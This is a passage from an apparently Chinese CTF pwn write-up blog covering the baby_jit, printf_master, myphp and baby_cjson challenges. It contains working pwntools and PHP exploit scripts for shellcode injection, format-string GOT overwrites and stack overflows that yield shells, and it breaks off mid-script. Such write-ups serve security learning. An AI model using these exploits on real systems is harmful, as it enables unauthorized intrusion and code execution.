class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./baby_jit&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;./libc-2.31.so&#x27;,checksec=False)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">ra  =<span class="keyword">lambda</span> time=<span class="number">0.5</span>:p.recvall(timeout=time)</span><br><span class="line">u7f =<span class="keyword">lambda</span>:<span class="built_in">int</span>(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">0x8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">script = <span class="number">0</span></span>):</span><br><span class="line"><span class="keyword">if</span>(script):</span><br><span class="line">gdb.attach(p, script)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line"><span class="keyword">if</span>(local):</span><br><span class="line"><span class="keyword">return</span> process(elf_path)</span><br><span class="line"><span class="keyword">return</span> remote(<span class="string">&#x27;10.1.170.18&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">content</span>):</span><br><span class="line">sla(<span class="string">b&#x27;&gt;&gt; &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;add &#x27;</span>+tbs(content))</span><br><span class="line"></span><br><span class="line">add(<span class="built_in">int</span>(<span class="string">&#x27;06eb67616c6668&#x27;</span>,<span class="number">16</span>))</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">add(<span class="built_in">int</span>(<span class="string">&#x27;06ebd231e78948&#x27;</span>,<span class="number">16</span>))</span><br><span class="line">add(<span class="built_in">int</span>(<span class="string">&#x27;07eb026af631&#x27;</span>,<span class="number">16</span>))</span><br><span class="line">add(<span class="built_in">int</span>(<span class="string">&#x27;06ebc031050f58&#x27;</span>,<span class="number">16</span>))</span><br><span class="line">add(<span class="built_in">int</span>(<span class="string">&#x27;06eb286a5f036a&#x27;</span>,<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="built_in">int</span>(<span class="string">&#x27;07ebe689485a&#x27;</span>,<span class="number">16</span>))</span><br><span class="line">add(<span class="built_in">int</span>(<span class="string">&#x27;07eb016a050f&#x27;</span>,<span class="number">16</span>))</span><br><span class="line">add(<span class="built_in">int</span>(<span class="string">&#x27;07eb4a286a5f&#x27;</span>,<span class="number">16</span>))</span><br><span class="line">add(<span class="built_in">int</span>(<span class="string">&#x27;06eb016ae68948&#x27;</span>,<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="built_in">int</span>(<span class="string">&#x27;050f58&#x27;</span>,<span class="number">16</span>))</span><br><span class="line">dbg()</span><br><span class="line">sla(<span class="string">b&#x27;&gt;&gt; &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;offset?&#x27;</span>,<span class="string">b&#x27;0.177&#x27;</span>)</span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h1 id="printf-master"><a href="#printf-master" class="headerlink" title="printf_master"></a>printf_master</h1><p>格式化字符串题,不算很难但绝对够恶心</p><p>用户可选获得libc,heap,code,stack中的一个的最低两个字节</p><p>个人选择的是stack,可以避免第一步的爆破</p><p>之后存在一次格式化字符串机会,但是禁用了<code>$</code>以及<code>n</code>字符不能够出现超过4次</p><p>没有充足的信息且仅有一次格式化字符串显然很难完成利用,所以我们需要想办法<strong>获得更多次数的格式化字符串利用</strong></p><p>这里唯一的办法应该是就是利用<code>%n</code>修改printf的返回地址,再次回到输入name并格式化字符串利用的位置,以此获得足够的利用机会,这样的话就会需要栈上二级指针,好在是有的,不过修改返回地址的时候会有一次1/16爆破</p><p>那么第一步应该就是完成泄露,并再次回到格式化字符串漏洞</p><p>第二步以及之后的操作便是利用栈上的信息来任意写,一个可选方案是<strong>修改free的got表</strong>,然后最后一次漏洞利用的时候,在格式化字符串最前面是<code>/bin/sh;</code>,这样后面释放的时候就会getshell</p><p>虽然说起来简单,但实际上因为</p><ol><li>本题对格式化字符串漏洞的限制</li><li>过程中存在的爆破</li><li>地址随机化对格式化字符串<code>%n</code>的影响</li></ol><p>使得exp的编写是绝对够恶心的</p><p>本人一贯是没什么耐心的,exp只完成了第一步,还没有优化格式化字符串的构造(没有优化的话爆破成功率还<strong>不到1/16</strong>),但想来这题应该就是这么个思路</p><p>仅供参考:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">ra  =<span class="keyword">lambda</span> time=<span class="number">0.5</span>:p.recvall(timeout=time)</span><br><span class="line">u7f =<span class="keyword">lambda</span>:u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">0x8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">fmt =<span class="keyword">lambda</span> string:<span class="built_in">eval</span>(<span class="string">f&quot;f&#x27;&#x27;&#x27;<span class="subst">&#123;string&#125;</span>&#x27;&#x27;&#x27;&quot;</span>, <span class="built_in">globals</span>()).encode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">script = <span class="number">0</span></span>):</span><br><span class="line"><span class="keyword">if</span>(script):</span><br><span class="line">gdb.attach(p, script)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line"><span class="keyword">if</span>(local):</span><br><span class="line"><span class="keyword">return</span> process(elf_path)</span><br><span class="line"><span class="keyword">return</span> remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>,tbs(<span class="number">1</span>))</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&#x27;stack&#x27;</span>,stack)</span><br><span class="line"><span class="comment">#第一步</span></span><br><span class="line">payload=<span class="string">b&#x27;%c&#x27;</span>*<span class="number">10</span>+<span class="string">b&#x27;%p&#x27;</span>+<span class="string">b&#x27;%c&#x27;</span>*<span class="number">3</span>+<span class="string">b&#x27;%p&#x27;</span>+fmt(<span class="string">&#x27;%&#123;stack-0x2a-0x17&#125;c&#x27;</span>)+<span class="string">b&#x27;%hn&#x27;</span>+<span class="string">b&#x27;%c&#x27;</span>*<span class="number">26</span>+fmt(<span class="string">&#x27;%&#123;0xf54e-stack-27-0xe7+0x100&#125;c&#x27;</span>)+<span class="string">b&#x27;%hn&#x27;</span></span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;your name?\n&#x27;</span>,payload)</span><br><span class="line">code=<span class="built_in">int</span>(ru(<span class="string">b&#x27;bd&#x27;</span>)[-<span class="number">12</span>:],<span class="number">16</span>)-<span class="number">0x16bd</span></span><br><span class="line">libc.address=<span class="built_in">int</span>(ru(<span class="string">b&#x27;83&#x27;</span>)[-<span class="number">12</span>:],<span class="number">16</span>)-<span class="number">0x24083</span></span><br><span class="line">leak(<span class="string">&#x27;code&#x27;</span>,code)</span><br><span class="line">leak(<span class="string">&#x27;libc&#x27;</span>,libc.address)</span><br><span class="line">system=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#dbg(&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#b *$rebase(0x154e)</span></span><br><span class="line"><span class="comment">#&#x27;&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#第二步</span></span><br><span class="line">payload=</span><br><span class="line">sa(<span class="string">b&#x27;your name?\n&#x27;</span>,payload)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h1 id="myphp"><a href="#myphp" class="headerlink" title="myphp"></a>myphp</h1><p>phppwn</p><p>以前做的题都是让用户上传一个php,然后执行这次给了一个这个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z,A-Z,0-9&lt;&gt;\?]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]) === <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>??听说需要用到web方向的一些绕过技巧,但我不会</p><p>漏洞在myphp.so中的zif_phppwn</p><p>memcpy使用的是传进字符串时给出的长度,但是check检查时却是使用的strlen计算出的结果</p><p>所以存在栈溢出,如果是上传php的话应该是这样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$heap_base</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$libc_base</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$libc</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$mbase</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">u64</span>(<span class="params"><span class="variable">$leak</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$leak</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$leak</span>);</span><br><span class="line">    <span class="variable">$leak</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$leak</span>);</span><br><span class="line">    <span class="variable">$leak</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$leak</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">p64</span>(<span class="params"><span class="variable">$addr</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$addr</span> = <span class="title function_ invoke__">dechex</span>(<span class="variable">$addr</span>);</span><br><span class="line">    <span class="variable">$addr</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$addr</span>);</span><br><span class="line">    <span class="variable">$addr</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$addr</span>);</span><br><span class="line">    <span class="variable">$addr</span> = <span class="title function_ invoke__">str_pad</span>(<span class="variable">$addr</span>, <span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leakaddr</span>(<span class="params"><span class="variable">$buffer</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$libc</span>,<span class="variable">$mbase</span>;</span><br><span class="line">    <span class="variable">$p1</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .*  \/usr\/lib\/php\/20190902\/myphp.so/&#x27;</span>;<span class="comment">//这个是我本地路径</span></span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$p1</span>, <span class="variable">$buffer</span>, <span class="variable">$mbase</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span>  <span class="variable">$module_base</span>, <span class="variable">$libc</span>, <span class="variable">$mbase</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>(<span class="string">&quot;leakaddr&quot;</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;/proc/self/maps&quot;</span>);</span><br><span class="line">    <span class="variable">$buffer</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">    <span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line">    <span class="title function_ invoke__">leakaddr</span>(<span class="variable">$buffer</span>);</span><br><span class="line">    <span class="variable">$module_base</span>=<span class="title function_ invoke__">hexdec</span>(<span class="variable">$mbase</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$libc_base</span>, <span class="variable">$module_base</span>;</span><br><span class="line">    <span class="variable">$payload</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\00&quot;</span>, <span class="number">0x128</span>).<span class="title function_ invoke__">p64</span>(<span class="variable">$module_base</span>+<span class="number">0x1c4d</span>);</span><br><span class="line"><span class="title function_ invoke__">phppwn</span>(<span class="variable">$payload</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">leak</span>();</span><br><span class="line"><span class="title function_ invoke__">attack</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>不过eval的话我就不会了,不知道有没有人是预期解做的</p><hr><p>看到了别的师傅的博客,其实<strong>真正的漏洞点</strong>应该在于</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int8 len; <span class="comment">// [rsp+14Fh] [rbp-41h]</span></span><br><span class="line">len = <span class="built_in">strlen</span>(arg);</span><br></pre></td></tr></table></figure><p>len是一个<u>单字节长度变量</u></p><p>所以只需要输入长度超过255的内容即可利用</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;hVymkNmp0NM0NcYCswNtFbUZuG1GXbwUPD9H&#x27;</span>.ljust(<span class="number">256</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;phppwn(<span class="subst">$payload</span>)&quot;</span>);</span><br></pre></td></tr></table></figure><h1 id="baby-cjson"><a href="#baby-cjson" class="headerlink" title="baby_cjson"></a>baby_cjson</h1><p>又是一题格式化字符串题目,题目名字叫cjson但其实没有任何关系,只需要会基础的语法就行了</p><p>对json的了解一直以来都停留在只是知道有这么个东西,比赛的时候就直接略过了,现在想来太不应该</p><p>首先花十分钟通过runoob大概了解一下json的基本内容</p><p>然后找了一个cJSON库<a href="https://github.com/DaveGamble/cJSON?tab=readme-ov-file">DaveGamble/cJSON: Ultralightweight JSON parser in ANSI C </a>大致看看一些api接口</p><p>然后就可以开始分析了</p><p>然后发现这题和json压根没有什么关系,就是套了个json的壳</p><p>在delete功能中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_4FAA</span><span class="params">(__int64 a1, <span class="type">const</span> <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = sub_4662(a1, a2);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">&#x27;[&#x27;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(a2);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;] been deleted&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> sub_4E2F(a1, v3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>a2是用户可控的,所以存在一个格式化字符串漏洞</p><p>这题与之前那题相比无疑友好了许多,没有字符限制且无限制次数,但格式化字符串长度被要求不能超过24,这个要求同样很严格</p><p>在尝试后发现,这题单靠这个格式化字符串漏洞很难完成利用(其实应该是可以的)</p><p>于是尝试在edit中触发parse错误退出,然后看看改link_map的l_info能不能行,分析parse出错只能在edit中</p><p>结果在edit功能中随便输入一些数据时发现出现了<code>*** stack smashing detected ***: terminated</code>错误</p><p>那就是有栈溢出,gdb顺藤摸瓜找到了这个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">sub_15B6</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, __int64 (__fastcall **a2)(<span class="type">size_t</span>))</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> n; <span class="comment">// [rsp+10h] [rbp-9A0h]</span></span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// [rsp+18h] [rbp-998h]</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">632</span>]; <span class="comment">// [rsp+730h] [rbp-280h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+9A8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  n = <span class="built_in">strlen</span>(a1) + <span class="number">1</span>;</span><br><span class="line">  v4 = (<span class="type">void</span> *)(*a2)(n);</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( n &lt;= <span class="number">0xFFF</span> )</span><br><span class="line">    <span class="built_in">memcpy</span>(dest, a1, <span class="number">0x1000</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>(v4, a1, n);</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那思路就明确了,printf泄露然后栈溢出控制流</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">elf_path=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(elf_path,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">context.binary=elf_path</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">ra  =<span class="keyword">lambda</span> time=<span class="number">0.5</span>:p.recvall(timeout=time)</span><br><span class="line">u7f =<span class="keyword">lambda</span>:u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">0x8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span 